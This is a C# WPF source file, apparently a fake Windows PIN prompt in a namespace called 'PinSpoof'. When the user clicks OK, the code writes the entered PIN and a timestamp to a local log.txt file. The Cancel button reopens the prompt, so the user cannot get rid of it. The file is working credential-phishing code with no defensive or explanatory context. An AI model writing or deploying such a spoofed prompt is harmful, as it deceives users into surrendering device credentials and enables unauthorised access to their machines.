using System;
using System.IO;
using System.Windows;

namespace PinSpoof
{
    public partial class PinWindow : Window
    {
        public PinWindow()
        {
            InitializeComponent();
            PinBox.Focus();
        }

        private void OkButton_Click(object sender, RoutedEventArgs e)
        {
            using (StreamWriter w = File.AppendText("log.txt"))
            {
                w.WriteLine($"{DateTime.Now.ToLongTimeString()} {DateTime.Now.ToLongDateString()}");
                w.WriteLine($":{PinBox.Password}");
                w.WriteLine("--------------------------------");
            }
            this.Close();
        }

        private void CancelButton_Click(object sender, RoutedEventArgs e)
        {
            PinWindow window = new PinWindow();
            window.Show();
            this.Close();
        }

        private void PinChangedHandler(Object sender, RoutedEventArgs e)
        {
            if (PinBox.Password != "") OkButton.IsEnabled = true;
            else OkButton.IsEnabled = false;
        }
    }
}


